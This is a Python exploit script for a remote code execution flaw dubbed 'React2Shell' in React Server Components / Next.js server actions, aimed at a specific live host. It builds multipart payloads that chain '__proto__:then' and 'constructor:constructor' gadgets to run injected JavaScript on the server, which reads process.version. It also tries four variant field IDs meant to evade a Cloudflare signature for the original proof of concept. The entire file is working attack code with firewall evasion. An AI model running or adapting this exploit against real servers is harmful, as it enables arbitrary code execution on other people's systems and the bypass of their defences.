#!/usr/bin/env python3
"""React2Shell variant-id gadget tests: same semantics, different field IDs
(CF rule may signature the PoC's exact '$1:constructor:constructor' / '$1:__proto__:then')."""
import ssl, json, time, random, string, http.cookiejar, urllib.request, urllib.error

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BASE = "https://onlyfakeai.ru"
cj = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX),
                                     urllib.request.HTTPCookieProcessor(cj))
MARK = "R2S_AUDIT_PROBE_"
PREFIX = ("var res=(typeof process!=='undefined'?process.version:'noproc');"
          "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'" + MARK + "'+res});")


def req(method, url, headers=None, body=None, timeout=30):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with OPENER.open(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()


def is_cf(b):
    return "Attention Required" in b.decode("utf-8", "ignore")[:3000]


def rnd(n=24):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def part(name, val, bnd):
    return f"--{bnd}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{val}\r\n"


def send(tag, then_tok, get_tok, f1='"$@0"', f2="[]", extra_parts=()):
    p0 = ('{"then":"' + then_tok + '","status":"resolved_model","reason":-1,'
          '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
          + json.dumps(PREFIX) + ',"_chunks":"$Q2","_formData":{"get":"' + get_tok + '"}}}')
    bnd = "----B" + rnd(30)
    body = part("0", p0, bnd) + part("1", f1, bnd) + part("2", f2, bnd)
    for n, v in extra_parts:
        body += part(n, v, bnd)
    body += f"--{bnd}--\r\n"
    st, hd, b = req("POST", BASE + "/", headers={
        "Content-Type": f"multipart/form-data; boundary={bnd}",
        "Next-Action": rnd(40), "Accept": "text/x-component",
        "Origin": BASE, "Referer": BASE + "/"}, body=body.encode())
    t = b.decode("utf-8", "ignore")
    print(f"[{tag}] HTTP {st} cf={is_cf(b)} marker={MARK in t} len={len(b)}")
    if st != 403:
        print("   body:", t[:300].replace("\n", " "))
    if MARK in t:
        i = t.find(MARK)
        print("   >>> DIGEST:", t[i:i + 170].replace("\n", " "))
    time.sleep(2)


req("GET", BASE + "/")
time.sleep(1)

# C1: constructor chain on field 2 (array) instead of field 1
send("C1 get=$2", "$1:__proto__:then", "$2:constructor:constructor")
# C2: then-gadget on field 2, ctor on field 1
send("C2 then=$2", "$2:__proto__:then", "$1:constructor:constructor")
# C3: constructor chain on a third object field
send("C3 get=$3", "$1:__proto__:then", "$3:constructor:constructor",
     extra_parts=(("3", "{}"),))
# C4: literal token split across two parts via reference (then on field1, ctor on field2)
send("C4 both=$2", "$2:__proto__:then", "$2:constructor:constructor", f2='"$@0"')
